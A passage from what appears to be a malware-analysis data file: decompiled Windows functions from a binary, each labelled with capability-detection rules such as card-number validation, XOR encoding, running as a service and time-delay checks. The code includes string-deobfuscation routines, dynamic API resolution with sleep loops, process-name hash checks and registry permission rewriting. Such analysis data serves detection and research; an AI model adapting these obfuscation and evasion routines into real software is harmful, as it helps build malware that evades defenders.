        "decompiled_code": "\nint32_t __fastcall fcn.0040d888(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "0040f176": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f176(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 424
    },
    "0040f6eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f6eb(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + -0x44;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 163
    },
    "0040f710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040f710(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x15;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) << 6;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 221
    },
    "0040f783": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040f783(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x21;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * '_';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 220
    },
    "0040f7cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pAceList\n\nbool fcn.0040f7cd(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBX;\n    uint *puVar3;\n    uchar auStack65616 [65500];\n    uint uStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint *puStack104;\n    uint *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint *puStack88;\n    uint uStack84;\n    uint *var_38h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint *puStack44;\n    uint *lpbDaclDefaulted;\n    uint *pAclInformation;\n    uint *uBytes;\n    uint uStack28;\n    uint lpcbSecurityDescriptor;\n    int32_t lpbDaclPresent;\n    uint pSecurityDescriptor;\n    uint *pDacl;\n    int32_t pAceList;\n    \n    pAceList = 0x40f7da;\n    sub.ntdll.dll__chkstk();\n    pDacl = &fcn.0040f7cd::lpcbSecurityDescriptor;\n    lpbDaclPresent = 4;\n    uStack28 = 0x40f7fb;\n    pAceList = unaff_EBX;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegGetKeySecurity)();\n    if (iVar1 == 0) {\n        uStack28 = 1;\n        uBytes = &fcn.0040f7cd::var_38h;\n        pAclInformation = 0x40f812;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)();\n        if (iVar1 != 0) {\n            pAclInformation = &fcn.0040f7cd::lpbDaclDefaulted;\n            lpbDaclDefaulted = &fcn.0040f7cd::pDacl;\n            puStack44 = &fcn.0040f7cd::lpbDaclPresent;\n            puStack48 = &stack0xfffeffb0;\n            uStack52 = 0x40f82f;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_GetSecurityDescriptorDacl)();\n            if (iVar1 != 0) {\n                uStack52 = 2;\n                uStack56 = 0xc;\n                var_38h = &fcn.0040f7cd::pAclInformation;\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetAclInformation)();\n                if (iVar1 != 0) {\n                    puStack88 = uBytes + 4;\n                    uStack84 = 0x40f859;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n                    uStack84 = 2;\n                    puStack96 = 0x40f865;\n                    uStack92 = uVar2;\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeAcl)();\n                    if (iVar1 != 0) {\n                        if ((lpbDaclPresent != 0) && (pAclInformation != NULL)) {\n                            puVar3 = NULL;\n                            do {\n                                puStack96 = &fcn.0040f7cd::pAceList;\n                                puStack104 = pDacl;\n                                puStack108 = 0x40f887;\n                                puStack100 = puVar3;\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_GetAce)();\n                                if (iVar1 == 0) goto code_r0x0040f8c8;\n                                *(pAceList + 4) = 0x80000000;\n                                puStack96 = *(pAceList + 2);\n                                puStack100 = pAceList;\n                                puStack104 = 0xffffffff;\n                                puStack108 = 0x2;\n                                uStack116 = 0x40f8a9;\n                                uStack112 = uVar2;\n                                iVar1 = (*_sym.imp.ADVAPI32.dll_AddAce)();\n                                if (iVar1 == 0) goto code_r0x0040f8c8;\n                                puVar3 = puVar3 + 1;\n                            } while (puVar3 < pAclInformation);\n                        }\n                        puStack96 = NULL;\n                        puStack104 = 0x1;\n                        puStack108 = &fcn.0040f7cd::var_38h;\n                        uStack112 = 0x40f8c4;\n                        puStack100 = uVar2;\n                        iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)();\n                        if (iVar1 != 0) {\n                            puStack96 = &fcn.0040f7cd::var_38h;\n                            puStack100 = 0x4;\n                            puStack108 = 0x40f8e0;\n                            iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetKeySecurity)();\n                            uStack112 = 0x40f8ee;\n                            puStack108 = uVar2;\n                            (*_sym.imp.KERNEL32.dll_LocalFree)();\n                            return iVar1 == 0;\n                        }\n                    }\ncode_r0x0040f8c8:\n                    puStack100 = 0x40f8cf;\n                    puStack96 = uVar2;\n                    (*_sym.imp.KERNEL32.dll_LocalFree)();\n                    return false;\n                }\n            }\n        }\n    }\n    return false;\n}\n",
        "token_count": 1196
    },
    "0040ff67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0040ff67(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x19;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) ^ 0x50;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 223
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "run as service/d064d29e3d74448f8f6f16837eb4b2f8"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00410082": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00410082(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_14h = param_1;\n    var_10h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_14h;\n                param_2 = var_10h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 544
    },
    "004121c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004121c2(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + 'W';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 160
    },
    "004121e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.004121e7(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x51;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n    uVar2 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) + 'N';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 221
    },
    "00412229": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412229(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) + '\\b';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 159
    },
    "0041224e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __fastcall fcn.0041224e(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    *param_1 = 0x4d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar3 = 0;\n    param_1[1] = uVar2;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar3) = *(param_1[1] + uVar3) * '\\r';\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *param_1);\n    }\n    sub.ntdll.dll_memset(param_1[1], 0, *param_1);\n    return param_1;\n}\n",
        "token_count": 223
    },
    "004124c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004124c9(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    char cVar6;\n    char cVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_28h = 0x272b1f1a;\n    var_24h = 0xb2a0317;\n    var_20h = 0x14072636;\n    var_1ch = 0x2d271f3e;\n    var_18h._0_2_ = 0x1820;\n    var_18h._2_1_ = 0x2e;\n    var_18h._3_1_ = 6;\n    var_14h = 0x42;\n    var_10h = 0x43426a4f;\n    var_ch._0_2_ = 0x7154;\n    fcn.0040ac9b(param_1);\n    iVar5 = var_8h;\n    var_8h = &var_28h - var_8h;\n    var_4h = 0;\n    do {\n        iVar8 = var_4h;\n        pcVar1 = var_4h + iVar5;\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_10h + iVar8 % 6);\n        uVar3 = pcVar1[var_8h];\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    } while (var_4h < 0x15);\n    while (iVar8 = (*pcVar4)(0, iVar5),  iVar8 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar9);\n    return;\n}\n",
        "token_count": 597
    },
    "00413612": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00413612(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x4279dc);\n    iVar4 = fcn.0040a52c();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 >> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x004136a2;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x004136a2:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 471
    },
    "004139a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "run as service/d064d29e3d74448f8f6f16837eb4b2f8"
        ],
        "decompiled_code": "\nuint fcn.004139a0(void)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = (*_sym.imp.SHLWAPI.dll_StrRChrW)(*0x4279dc, 0, 0x5c);\n    var_8h = 0;\n    var_10h = var_10h + 2;\n    var_4h = 0;\n    var_ch = 0x41002b;\n    (*_sym.imp.ADVAPI32.dll_StartServiceCtrlDispatcherW)(&var_10h);\n    return 0;\n}\n",
        "token_count": 147
    },
    "0040ccde": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "read file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ccde(uint lpNumberOfBytesRead, uint hSourceHandle, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpBuffer;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar4 = 0;\n    var_4h = 0;\n    lpBuffer = 0;\n    var_8h = 0;\n    piVar1 = fcn.0040cc32();\n    if (*piVar1 == 0) {\n        uVar4 = 0;\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(hSourceHandle, piVar1[1], &var_4h, 0x1f0000, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        uVar2 = 0;\n        if (iVar3 != 0) {\n            uVar2 = var_4h;\n        }\n        iVar3 = fcn.0040cca9(uVar2);\n        if (iVar3 != 0) {\n            lpNumberOfBytesRead = 0;\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(*piVar1, &lpBuffer, 8, &lpNumberOfBytesRead, 0);\n            if ((iVar3 != 0) && (var_8h == 0)) {\n                uVar4 = 1;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 405
    },
    "004035ae": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004035ae(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) ^ 0x71;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar1);\n    return;\n}\n",
        "token_count": 161
    },
    "0040678e": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040678e(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) ^ 0x59;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 162
    },
    "00409871": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409871(uint32_t *param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*param_1 != 0) {\n        do {\n            *(param_1[1] + uVar2) = *(param_1[1] + uVar2) ^ 0xde;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *param_1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 160
    },
    "00401251": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401251(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint uVar4;\n    uint *arg_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\n    arg_14h = &var_4h;\n    uVar4 = 0;\ncode_r0x004012aa:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.004063e1(in_EDX, 0, &arg_8h, arg_14h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x004012c2:\n            fcn.0041016b();\n            goto code_r0x004012c9;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0041016b();\n            goto code_r0x004012aa;\n        }\n        if (uVar1 < 5) goto code_r0x004012c2;\n        if (*puVar2[1] == uVar1) {\ncode_r0x004012c9:\n            if (*puVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 2\");\n            }\n            else if (puVar2[1] != 0) {\n                fcn.0040fa6e();\n                iVar3 = fcn.00401178(arg_ch);\n                if (iVar3 == 0) {\n                    fcn.0041016b();\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 3\");\n                    fcn.0041016b();\n                    uVar4 = 1;\n                }\n            }\n            return uVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 492
    },
    "00411da8": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.00411da8(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.004116d8();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.00411690();\n    return 0;\n}\n",
        "token_count": 80
    },
    "00401fd2": {
        "rules": [
            "check process job object/8aaf725824be4e7b84101cffc1f879ea",
            "open process"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00401fd2(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (iVar1 != 0) {\n        iVar2 = fcn.00401d3d();\n        if (iVar2 != 0) {\n            iVar4 = fcn.0040144b();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return iVar4 == 0;\n}\n",
        "token_count": 190
    },
    "0040db7c": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuchar fcn.0040db7c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar uVar4;\n    uchar *puVar5;\n    uint hKey;\n    int32_t var_4h;\n    \n    uVar4 = 0;\n    var_4h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                      (0x80000001, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\", 0, 0x20019, &hKey\n                      );\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, L\"ProxyEnable\", 0, 0, 0, &var_4h);\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_4h);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar1 = var_4h;\n            puVar5 = puVar3;\n            if (puVar3 != NULL) {\n                for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, L\"ProxyEnable\", 0, 0, puVar3, &var_4h);\n                if (iVar1 == 0) {\n                    uVar4 = *puVar3;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    else {\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 459
    },
    "0040dc26": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuchar fcn.0040dc26(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar uVar4;\n    uchar *puVar5;\n    uint hKey;\n    int32_t var_4h;\n    \n    uVar4 = 0;\n    var_4h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                      (0x80000001, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\", 0, 0x20019, &hKey\n                      );\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, L\"AutoDetect\", 0, 0, 0, &var_4h);\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_4h);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar1 = var_4h;\n            puVar5 = puVar3;\n            if (puVar3 != NULL) {\n                for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, L\"AutoDetect \", 0, 0, puVar3, &var_4h);\n                if (iVar1 == 0) {\n                    uVar4 = *puVar3;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    else {\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 458
    },
    "00412298": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
